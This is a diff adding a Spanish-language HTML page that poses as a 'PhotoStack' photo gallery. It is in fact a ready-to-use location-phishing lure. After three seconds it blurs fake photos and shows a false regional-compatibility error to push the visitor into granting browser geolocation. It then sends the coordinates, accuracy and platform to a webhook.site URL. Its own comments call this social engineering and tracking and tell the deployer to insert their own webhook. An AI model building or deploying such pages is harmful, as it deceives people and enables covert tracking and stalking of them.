@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PhotoStack Premium - Error de Conexión</title>
+    <style>
+        /* --- ESTILOS PROFESIONALES Y BLUR --- */
+        :root {
+            --primary-red: #ff3b30;
+            --dark-bg: #121212;
+            --text-main: #e0e0e0;
+        }
+
+        body, html {
+            margin: 0; padding: 0; height: 100%;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--dark-bg); color: var(--text-main);
+            overflow: hidden; /* Evitar scroll durante el blur */
+        }
+
+        /* Contenedor principal con BLUR dinámico */
+        #main-container {
+            width: 100%; height: 100%;
+            display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 15px; padding: 20px; box-sizing: border-box;
+            transition: filter 0.6s ease; /* Animación suave del blur */
+        }
+
+        /* Fotos grises "cargando" */
+        .photo-placeholder {
+            background-color: #2a2a2a; border-radius: 8px;
+            aspect-ratio: 1 / 1; /* Cuadradas */
+            position: relative; overflow: hidden;
+        }
+
+        /* Animación de carga (shimmer) */
+        .photo-placeholder::after {
+            content: ""; position: absolute; top: 0; left: -100%;
+            width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.05), transparent);
+            animation: shimmer 1.5s infinite;
+        }
+
+        @keyframes shimmer { 100% { left: 100%; } }
+
+        /* --- SUPERPOSICIÓN DE ERROR (OVERLAY) --- */
+        #error-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-color: rgba(0, 0, 0, 0.7); /* Fondo semi-transparente */
+            display: flex; justify-content: center; align-items: center;
+            opacity: 0; visibility: hidden; /* Oculto al inicio */
+            transition: opacity 0.5s ease; z-index: 1000;
+        }
+
+        /* Tarjeta de notificación roja profesional */
+        .error-card {
+            background-color: #1e1e1e; border-radius: 16px;
+            width: 90%; max-width: 400px;
+            padding: 30px; box-sizing: border-box;
+            border: 1px solid rgba(255,255,255,0.1);
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            
+            /* Animación de entrada (pop-in) */
+            transform: scale(0.8);
+            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        /* Estado ACTIVO del overlay y tarjeta */
+        #error-overlay.active { opacity: 1; visibility: visible; }
+        #error-overlay.active .error-card { transform: scale(1); }
+
+        /* Icono de advertencia */
+        .warning-icon {
+            font-size: 50px; color: var(--primary-red);
+            margin-bottom: 20px; display: inline-block;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.1); opacity: 0.8; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .error-title {
+            font-size: 20px; font-weight: 700; color: #fff;
+            margin-bottom: 10px; text-transform: uppercase;
+        }
+
+        .error-text {
+            font-size: 15px; line-height: 1.5; color: #b0b0b0;
+            margin-bottom: 25px;
+        }
+
+        /* Botón profesional de acción */
+        .action-button {
+            background-color: var(--primary-red); color: #fff;
+            border: none; padding: 12px 24px;
+            font-size: 16px; font-weight: 600;
+            border-radius: 8px; cursor: pointer;
+            transition: background-color 0.3s ease;
+            width: 100%;
+        }
+
+        .action-button:hover { background-color: #ff5c52; }
+
+    </style>
+</head>
+<body>
+
+    <div id="main-container">
+        </div>
+
+    <div id="error-overlay">
+        <div class="error-card">
+            <div class="warning-icon">⚠️</div>
+            <div class="error-title">Error de Compatibilidad</div>
+            <div class="error-text">
+                Los servidores de **PhotoStack México** no son compatibles con la regulación de su región actual. 
+                <br><br>
+                Se requiere **activar la ubicación** para sincronizar con un nodo de servidor compatible en su país y restaurar el acceso.
+            </div>
+            <button class="action-button" onclick="requestLocation()">Sincronizar Ubicación</button>
+        </div>
+    </div>
+
+    <script>
+        // --- LÓGICA DE INTERFAZ Y RASTREO ---
+
+        // 1. Generar placeholders de fotos grises
+        const container = document.getElementById('main-container');
+        for (let i = 0; i < 20; i++) {
+            const div = document.createElement('div');
+            div.className = 'photo-placeholder';
+            container.appendChild(div);
+        }
+
+        // 2. Temporizador de 3 segundos para el error
+        setTimeout(() => {
+            // Aplicar BLUR al contenedor de fotos
+            document.getElementById('main-container').style.filter = 'blur(10px)';
+            // Mostrar la notificación roja
+            document.getElementById('error-overlay').classList.add('active');
+        }, 3000); // 3000ms = 3 segundos
+
+        // 3. Función al hacer clic en el botón (Ingeniería Social)
+        function requestLocation() {
+            if ("geolocation" in navigator) {
+                // ESTO DISPARA EL AVISO NATIVO DEL NAVEGADOR
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        // ÉXITO: Usuario permitió la ubicación
+                        const data = {
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude,
+                            precision: position.coords.accuracy + "m",
+                            plataforma: navigator.platform,
+                            timestamp: new Date().toISOString()
+                        };
+                        
+                        // Ocultar error y mostrar "Cargando..."
+                        document.querySelector('.error-title').innerHTML = "Sincronizando...";
+                        document.querySelector('.error-text').innerHTML = "Conectando al nodo más cercano. Por favor espere.";
+                        document.querySelector('.action-button').style.display = 'none';
+
+                        // ENVIAR DATOS A TU WEBHOOK
+                        sendToWebhook(data);
+                    },
+                    (error) => {
+                        // ERROR: Usuario denegó el permiso
+                        document.querySelector('.error-text').innerHTML = 
+                            "<span style='color:#ff3b30;'>Error crítico: No se pudo verificar la región. El acceso permanecerá bloqueado.</span>";
+                    }
+                );
+            } else {
+                alert("Su navegador no soporta geolocalización.");
+            }
+        }
+
+        // 4. Función para enviar datos al exterior (Webhook)
+        function sendToWebhook(data) {
+            // !!! REEMPLAZA ESTO CON TU URL DE WEBHOOK.SITE !!!
+            const WEBHOOK_URL = 'https://webhook.site/2251efe8-cd5e-4051-b2c7-0f8f5baf7fd8'; 
+
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                mode: 'no-cors', // Evita bloqueos de seguridad básicos
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).then(() => {
+                // Opcional: Redirigir a una página real después de enviar
+                // window.location.href = "https://google.com";
+            });
+        }
+    </script>
+</body>
+</html>
